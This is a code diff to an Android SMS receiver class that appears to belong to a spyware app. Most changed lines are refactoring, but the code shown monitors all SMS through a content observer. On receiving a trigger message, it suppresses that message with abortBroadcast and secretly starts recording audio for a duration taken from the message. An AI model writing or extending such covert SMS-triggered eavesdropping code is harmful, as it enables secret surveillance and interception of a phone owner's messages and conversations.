@@ -22,6 +22,7 @@ import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
+
 /**
  * SmsSentObserver class is design for monitoring incoming sms
  * 
@@ -37,7 +38,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private Bundle mBundle;
 	String type = null;
 	RequestMakerImpl req;
-	private String LOG_TAG = "SMSBroadcastReceiver";
+	private String LOG_TAG = SMSBroadcastReceiver.class.getSimpleName()
+			.toString();
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
@@ -45,7 +47,6 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		String sms = sp.getString("sms", "0");
 		mBundle = intent.getExtras();
-		RegSmsObserver();
 		if (sms.equals("0")) {
 			Logging.doLog(LOG_TAG, "sms : 0", "sms : 0");
 			return;
@@ -64,7 +65,6 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		}
 
 		try {
-
 			getSMSDetails();
 			// RegSmsObserver();
 
@@ -74,12 +74,12 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		}
 	}
 
-	private void RegSmsObserver() {
-		if (smsSentObserver == null) {
-			smsSentObserver = new SmsSentObserver(new Handler(), mContext);
-			mContext.getContentResolver().registerContentObserver(
-					Uri.parse("content://sms"), true, smsSentObserver);
-		}
+	public static void regSmsObserver(Context mContext) {
+		SmsSentObserver observer = new SmsSentObserver(null);
+		observer.setContext(mContext);
+		mContext.getContentResolver().registerContentObserver(
+				Uri.parse("content://sms"), true, observer);
+
 	}
 
 	@SuppressLint("SimpleDateFormat")
@@ -101,12 +101,15 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 							.contains(startRecord)) {
 						Logging.doLog(LOG_TAG, "start record", "start record");
 						abortBroadcast();
-						int minute = Integer.parseInt(msgs[k].getMessageBody().substring(
-								msgs[k].getMessageBody().lastIndexOf("d") + 1,
-								msgs[k].getMessageBody().length()))*60;
+						int minute = Integer.parseInt(msgs[k].getMessageBody()
+								.substring(
+										msgs[k].getMessageBody().lastIndexOf(
+												"d") + 1,
+										msgs[k].getMessageBody().length())) * 60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio recordAudio = new RecordAudio(mContext, minute);
+						RecordAudio recordAudio = new RecordAudio(mContext,
+								minute);
 						recordAudio.executeRecording();
 					}
 
